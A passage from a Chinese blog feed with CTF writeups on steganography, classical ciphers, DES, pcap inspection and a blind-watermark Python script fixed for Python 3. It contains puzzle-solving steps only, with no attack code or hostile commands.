href="http://www.safe6.cn/article/102">使用方法</a>，然后就可以解题了。<br><img src="https://img-blog.csdnimg.cn/20200405094830682.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>看着明显不是flag，像是栅栏密码，在线网站解一下<br><img src="https://img-blog.csdnimg.cn/20200405095019263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>get</p><h3 id="双图"><a href="#双图" class="headerlink" title="双图"></a><h3 id="25">双图</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200405095114233.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>一顿操作猛如虎，一看码子扫不出来，<br><img src="https://img-blog.csdnimg.cn/20200405095358153.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>保存这个二维码，（其实我还去搜了彩色的二维码能不能识别，sha子行为），然后再用stegsolve打开这张码子，<br><img src="https://img-blog.csdnimg.cn/20200405095835102.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>我把三张图一块截了，第一张是DES<br>第二张是6XaMMbM7<br>第三张是长字符串。搜一下了解到有DES加密这个密码。而且有在线解密网站，直接搜就好了，第二个是密钥。第三个是密文<br>在线解密可得出flag</p><h3 id="拼图"><a href="#拼图" class="headerlink" title="拼图"></a><h3 id="26">拼图</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200405101557773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>有两种方法，一种比较暴力，一种比较正规。<br>用到题中提示的工具，真是不得不说，下载安装真的烦，到现在我仍然是报错。烦死了，不装了，其实我已经装这个工具两天了，一个接一个的，浪费我时间艹。<br>可以直接拼出来，就直接拼吧，不会也就没办法了，工具用不了都是白搭，烦，快照都用了，还要重新下载以前下载的工具，真是烦，工具没捡到还丢了原本的工具，重装烦，。郁闷。<img src="https://img-blog.csdnimg.cn/20200405234958237.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>就这吧，以后不随便往kali安装第三方工具了，</p><h3 id="流量包签到"><a href="#流量包签到" class="headerlink" title="流量包签到"></a><h3 id="27">流量包签到</h3></h3><p><img src="https://img-blog.csdnimg.cn/20200405235238117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>打开这个工具，在工具中打开下载的文件，<br>然后随便点条数据，找到Source，右键单击选择追踪流，再选择TCP。就能看到flag了。<br><img src="https://img-blog.csdnimg.cn/20200406001501860.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>还有一个得到flag的办法，我第一次得到flag是用这个办法的，不过可能就这道题可以用吧。<br>歪门邪道：<br>直接将文件拖进winhex，搜索文本SL 或者flag（挨个试试呗)，结果还真找到了。就这样，没了。对了，要是想不到搜flag还是什么关键字的话，直接搜<code>&#123;</code>英文输出的大括号。也可以，多向下搜几次（试过了，可以）。<br><img src="https://img-blog.csdnimg.cn/20200406002708743.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>就这吧，最后几道题写的而过于简单，两天卡在一个地方，没心情写了，就这样吧。真累。</p><h3 id="盲水印"><a href="#盲水印" class="headerlink" title="盲水印"></a><h3 id="28">盲水印</h3></h3><p>补充一道题<br>最后做出来的，同样是需要工具</p><p><img src="https://img-blog.csdnimg.cn/20200406170918966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这道题工具给出，但是同样是在前两天没有get到工具，为什么是补充的呢？就是原本不打算继续这道题了，就没有再进行下去了。现在最后几个小时了，觉得还是有些不服气，为什么我做不出来，就又接着看，继续搞那个工具了。还是跟昨天一样的报错。（为了写博客，我又将我改好的设置改回原来在github上下载的原脚本。）</p><p><img src="https://img-blog.csdnimg.cn/20200406171741720.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>想到之前请教学长那个rsa的脚本的问题，就是关于python2和python3 中的除法的问题。跟这里很相似。<br>我就尝试了下自己改下脚本，原来的脚本是这样的</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">import</span> cv2<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> random<span class="token keyword">import</span> os<span class="token keyword">from</span> argparse <span class="token keyword">import</span> ArgumentParserALPHA <span class="token operator">=</span> <span class="token number">5</span><span class="token keyword">def</span> <span class="token function">build_parser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    parser <span class="token operator">=</span> ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--original'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'ori'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--image'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'img'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--result'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'res'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--alpha'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'alpha'</span><span class="token punctuation">,</span> default<span class="token operator">=</span>ALPHA<span class="token punctuation">)</span>    <span class="token keyword">return</span> parser<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    parser <span class="token operator">=</span> build_parser<span class="token punctuation">(</span><span class="token punctuation">)</span>    options <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>    ori <span class="token operator">=</span> options<span class="token punctuation">.</span>ori    img <span class="token operator">=</span> options<span class="token punctuation">.</span>img    res <span class="token operator">=</span> options<span class="token punctuation">.</span>res    alpha <span class="token operator">=</span> <span class="token builtin">float</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>alpha<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span>ori<span class="token punctuation">)</span><span class="token punctuation">:</span>        parser<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">"original image %s does not exist."</span> <span class="token operator">%</span> ori<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">:</span>        parser<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">"image %s does not exist."</span> <span class="token operator">%</span> img<span class="token punctuation">)</span>    decode<span class="token punctuation">(</span>ori<span class="token punctuation">,</span> img<span class="token punctuation">,</span> res<span class="token punctuation">,</span> alpha<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span>ori_path<span class="token punctuation">,</span> img_path<span class="token punctuation">,</span> res_path<span class="token punctuation">,</span> alpha<span class="token punctuation">)</span><span class="token punctuation">:</span>    ori <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span>ori_path<span class="token punctuation">)</span>    img <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span>img_path<span class="token punctuation">)</span>    ori_f <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>fft2<span class="token punctuation">(</span>ori<span class="token punctuation">)</span>    img_f <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>fft2<span class="token punctuation">(</span>img<span class="token punctuation">)</span>    height<span class="token punctuation">,</span> width <span class="token operator">=</span> ori<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ori<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    watermark <span class="token operator">=</span> <span class="token punctuation">(</span>ori_f <span class="token operator">-</span> img_f<span class="token punctuation">)</span> <span class="token operator">/</span> alpha    watermark <span class="token operator">=</span> np<span class="token punctuation">.</span>real<span class="token punctuation">(</span>watermark<span class="token punctuation">)</span>    res <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span>watermark<span class="token punctuation">.</span>shape<span class="token punctuation">)</span>    random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>height <span class="token operator">+</span> width<span class="token punctuation">)</span>    x <span class="token operator">=</span> <span class="token builtin">range</span><span class="token punctuation">(</span>height <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span>    y <span class="token operator">=</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span>    random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>y<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>height <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>            res<span class="token punctuation">[</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> watermark<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>    cv2<span class="token punctuation">.</span>imwrite<span class="token punctuation">(</span>res_path<span class="token punctuation">,</span> res<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>cv2<span class="token punctuation">.</span>IMWRITE_JPEG_QUALITY<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>这是原封不动的从github上下载下来的。<br><img src="https://img-blog.csdnimg.cn/20200406172155423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这两处的<code>/</code>改成<code>//</code>，然后保存，继续运行命令跑起来<br><img src="https://img-blog.csdnimg.cn/2020040617290130.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>可以看到还是报错了，但是刚做的改动可不是无用功，可以看出来比起上面的报错，没有了那个关于<code>/</code>的报错了，所以这一步是有用的。<br>再接着看错误。这个错误不懂，有道翻译一下（英语不好）<br>有点难懂，直接百度搜报错吧，挑挑选选找到了原因。<br><strong>原因：是python3中range不返回数组对象，而是返回range对象<br>加个声明为list的语句就行</strong><br>找到range的对象加上list让它返回列表<br><img src="https://img-blog.csdnimg.cn/20200406173702992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>将这里改成图中的样子就行。保存一下再跑<br><img src="https://img-blog.csdnimg.cn/2020040617382173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>已经没有报错了，这就是全部解决了。心情舒畅了许多。<br>最后再附上完整的正确脚本。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">import</span> cv2<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> random<span class="token keyword">import</span> os<span class="token keyword">from</span> argparse <span class="token keyword">import</span> ArgumentParserALPHA <span class="token operator">=</span> <span class="token number">5</span><span class="token keyword">def</span> <span class="token function">build_parser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    parser <span class="token operator">=</span> ArgumentParser<span class="token punctuation">(</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--original'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'ori'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--image'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'img'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--result'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'res'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--alpha'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'alpha'</span><span class="token punctuation">,</span> default<span class="token operator">=</span>ALPHA<span class="token punctuation">)</span>    <span class="token keyword">return</span> parser<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    parser <span class="token operator">=</span> build_parser<span class="token punctuation">(</span><span class="token punctuation">)</span>    options <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>    ori <span class="token operator">=</span> options<span class="token punctuation">.</span>ori    img <span class="token operator">=</span> options<span class="token punctuation">.</span>img    res <span class="token operator">=</span> options<span class="token punctuation">.</span>res    alpha <span class="token operator">=</span> <span class="token builtin">float</span><span class="token punctuation">(</span>options<span class="token punctuation">.</span>alpha<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span>ori<span class="token punctuation">)</span><span class="token punctuation">:</span>        parser<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">"original image %s does not exist."</span> <span class="token operator">%</span> ori<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">:</span>        parser<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">"image %s does not exist."</span> <span class="token operator">%</span> img<span class="token punctuation">)</span>    decode<span class="token punctuation">(</span>ori<span class="token punctuation">,</span> img<span class="token punctuation">,</span> res<span class="token punctuation">,</span> alpha<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span>ori_path<span class="token punctuation">,</span> img_path<span class="token punctuation">,</span> res_path<span class="token punctuation">,</span> alpha<span class="token punctuation">)</span><span class="token punctuation">:</span>    ori <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span>ori_path<span class="token punctuation">)</span>    img <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imread<span class="token punctuation">(</span>img_path<span class="token punctuation">)</span>    ori_f <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>fft2<span class="token punctuation">(</span>ori<span class="token punctuation">)</span>    img_f <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>fft2<span class="token punctuation">(</span>img<span class="token punctuation">)</span>    height<span class="token punctuation">,</span> width <span class="token operator">=</span> ori<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ori<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    watermark <span class="token operator">=</span> <span class="token punctuation">(</span>ori_f <span class="token operator">-</span> img_f<span class="token punctuation">)</span> <span class="token operator">/</span> alpha    watermark <span class="token operator">=</span> np<span class="token punctuation">.</span>real<span class="token punctuation">(</span>watermark<span class="token punctuation">)</span>    res <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span>watermark<span class="token punctuation">.</span>shape<span class="token punctuation">)</span>    random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>height <span class="token operator">+</span> width<span class="token punctuation">)</span>    x <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>height <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    y <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">)</span>    random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>y<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>height <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>            res<span class="token punctuation">[</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> watermark<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>    cv2<span class="token punctuation">.</span>imwrite<span class="token punctuation">(</span>res_path<span class="token punctuation">,</span> res<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>cv2<span class="token punctuation">.</span>IMWRITE_JPEG_QUALITY<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>这次也是收获好多，就这个盲水印让我明白自己看报错信息的重要性。解决了问题是真的爽。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF题记————再战GK、BUU</title>
      <link href="/posts/7051b12d/"/>
      <url>/posts/7051b12d/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>没事做一些杂项和密码学的题，记下没见过的，总结思路。扩大脑洞。</p><h1 id="Crypto🍖"><a href="#Crypto🍖" class="headerlink" title="Crypto🍖"></a>Crypto🍖</h1><h2 id="GKCTF2020-汉字的秘密"><a href="#GKCTF2020-汉字的秘密" class="headerlink" title="[GKCTF2020]汉字的秘密"></a>[GKCTF2020]汉字的秘密</h2><p>这道题当时没做出来，做了一半。<br>下载下来的word文档，打不开，然后就010Editor看一下，发现是压缩包，改后缀解压。<br>出来一堆文件<br><img src="https://img-blog.csdnimg.cn/20200602225923778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_RGV2b3Vy,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>当时做的时候，查到一篇博客(现在找不到了)，上面说这种题，信息一般都在document.xml中。然后就找<br>果然发现了信息，</p><pre class="language-bash" data-language="bash"><code class="language-bash">王壮 夫工 王中 王夫 由由井 井人 夫中 夫夫 井王 土土 夫由土夫 井中 士夫 王工 王人 土由 由口夫</code></pre><p>是当铺密码，然后进行转换是<br><img src="https://img-blog.csdnimg.cn/20200602230232491.png" alt="m0re" loading="lazy"><br>这串字符串确实不是flag，到这里我的思路就没有了，古典密码试了，看过wp后才明白是变异凯撒，之前还做过这种题，没想到害。<br>下面是简单脚本，</p><pre class="language-python" data-language="python"><code class="language-python">m0re<span class="token operator">=</span><span class="token string">"EJ>CvSHMV7G9R9@?3k"</span>flag<span class="token operator">=</span><span class="token string">''</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> a <span class="token keyword">in</span> miwen<span class="token punctuation">:</span>    i<span class="token operator">+=</span><span class="token number">1</span>    flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><p>跑出来flag，转换成小写提交。</p><h2 id="MRCTF2020-古典密码知多少"><a href="#MRCTF2020-古典密码知多少" class="headerlink" title="[MRCTF2020]古典密码知多少"></a>[MRCTF2020]古典密码知多少</h2><p>没见过的标准银河字母，其他的两种很容易看出来是猪圈密码和圣堂武士密码。然后对照百度找到的标准银河字母对照表进行解码<br><img src="https://img-blog.csdnimg.cn/20200624224410808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>解出得到<code>FGCPFLIrtuASyoN</code><br><img src="https://img-blog.csdnimg.cn/20200624224608503.png" alt="m0re" loading="lazy"><br>所以进行栅栏解密<br><img src="https://img-blog.csdnimg.cn/20200624224808962.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>得到flag</p><h2 id="MRCTF2020-keyboard"><a href="#MRCTF2020-keyboard" class="headerlink" title="[MRCTF2020]keyboard"></a>[MRCTF2020]keyboard</h2><p><img src="https://img-blog.csdnimg.cn/2020062514334950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>看着键盘，也不是26键的，就是9键的，而且数字的位数不超过三。<br>数字是按键，个数是第几个字母。<br>得到flag是mobilephond<br>但是提交不对，改成mobilephone就对了。</p><h2 id="WUSTCTF2020-佛说：只能四天"><a href="#WUSTCTF2020-佛说：只能四天" class="headerlink" title="[WUSTCTF2020]佛说：只能四天"></a>[WUSTCTF2020]佛说：只能四天</h2><p>题目是与佛论禅，这个新的老的都试了一遍，新约佛论禅是可以解出来的。<br>在线解密网站🔑<a href="http://hi.pcmoe.net/buddha.html">新约佛论禅</a><br><img src="https://img-blog.csdnimg.cn/20200625144941850.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>然后是社会主义核心价值观编码<br>在线网站🔑<a href="http://ctf.ssleye.com/cvencode.html">传送门</a><br><img src="https://img-blog.csdnimg.cn/20200625145053769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>最后doyouknowfence提示栅栏密码<br><img src="https://img-blog.csdnimg.cn/20200625145155710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>最后凯撒密码，然后hint中是有提示的。<br><img src="https://img-blog.csdnimg.cn/20200625145240162.png" alt="m0re" loading="lazy"><br>凯撒最初是移三位的。所以直接偏移3位即可。<br>得到后查看符合base32编码，进行base32解密<br><img src="https://img-blog.csdnimg.cn/20200625145548998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"></p><h1 id="Misc🍔"><a href="#Misc🍔" class="headerlink" title="Misc🍔"></a>Misc🍔</h1><h2 id="GKCTF2020-code-obfuscation"><a href="#GKCTF2020-code-obfuscation" class="headerlink" title="[GKCTF2020]code obfuscation"></a>[GKCTF2020]code obfuscation</h2><p>这个二维码是扭曲的，扫描是扫不出来的，看别人的wp，都是用ps了，各种方法都有，不过，QR research可以扫描，但是直接扫描也是扫描不出来的，下面一个比较有意思的方法，就是打开这个图片，截图粘贴到一块大的白屏上，然后尽可能让图片看起来小，再用工具扫描，就可以扫出来了。<br><img src="https://img-blog.csdnimg.cn/20200602232642766.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_RGV2b3Vy,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>然后进行文件分离，在图片中分离出来一个压缩包，有密码的，然后gkctf应该是解压密码，不过要进行base编码，只能挨个尝试，最后base58加密出来是对的。解压结果，一张图片和一个文件<br><img src="https://img-blog.csdnimg.cn/20200602233117782.png" alt="m0re" loading="lazy"><br>在线工具js美化——<a href="https://tool.lu/js/">传送门</a>，直接将1文件拖进去，点击美化。</p><p><img src="https://img-blog.csdnimg.cn/2020060223331385.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_RGV2b3Vy,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>看了大佬的博客，emmm，多少还是有点不理解的地方。<br>整理得到</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">for</span> n <span class="token keyword">in</span> a b c d e f g h i j k l m n o p q r s t u v w x y z <span class="token keyword">do</span> eval An <span class="token operator">=</span> <span class="token string">"n"</span>done<span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token constant">A</span> <span class="token constant">B</span> <span class="token constant">C</span> <span class="token constant">D</span> <span class="token constant">E</span> <span class="token constant">F</span> <span class="token constant">G</span> <span class="token constant">H</span> <span class="token constant">I</span> <span class="token constant">J</span> <span class="token constant">K</span> <span class="token 